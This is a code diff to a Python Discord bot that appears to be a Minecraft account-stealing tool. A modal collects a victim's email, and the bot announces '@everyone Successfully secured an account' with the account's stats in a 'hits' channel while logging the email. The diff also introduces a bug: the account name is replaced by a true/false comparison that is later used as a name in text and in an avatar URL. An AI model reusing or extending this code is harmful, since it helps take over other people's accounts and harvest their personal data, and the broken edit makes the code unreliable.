@@ -56,7 +56,7 @@ class MyModalOne(ui.Modal):
                 return
 
         # Check if email is valid
-        if re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email) is None:
+        if not re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email):
             await interaction.response.send_message(
                 embed = Embed(
                     title = "❌ Invalid Email Address",
@@ -232,6 +232,21 @@ class MyModalOne(ui.Modal):
                         )
                         return
 
+                    mc_name = (securedAccount['minecraft']['name'] == "No Minecraft")
+                    secured_desc = f"**{mc_name}** has been successfully secured."
+                    if mc_name:
+                        secured_desc = "An account has been secured but it does not own Minecraft."
+
+                    await sendLogs(
+                        interaction.client, config,
+                        Embed(
+                            title="New Account Secured",
+                            description=secured_desc,
+                            color=0xF4A460 if mc_name else 0x678DC6
+                        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
+                        email=email
+                    )
+
                     await hits_channel.send("@everyone **Successfully secured an account**")
                     await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
                     await hits_channel.send(
@@ -241,23 +256,6 @@ class MyModalOne(ui.Modal):
                         )
                     )
 
-                    mc_name = securedAccount['minecraft']['name']
-                    if securedAccount['minecraft']['SSID']:
-                        secured_desc = f"**{mc_name}** has been successfully secured."
-                        secured_thumb = f"https://mc-heads.net/avatar/{quote(mc_name)}/128"
-                    else:
-                        secured_desc = "This account has been secured but does not own Minecraft so it can be claimed by its email."
-                        secured_thumb = f"https://mc-heads.net/avatar/{username}/128"
-
-                    await sendLogs(
-                        interaction.client, config,
-                        Embed(
-                            title="New Account Secured",
-                            description=secured_desc,
-                            color=0x79D990
-                        ).set_thumbnail(url=secured_thumb),
-                        email=email
-                    )
                     return
 
                 await asyncio.sleep(1)
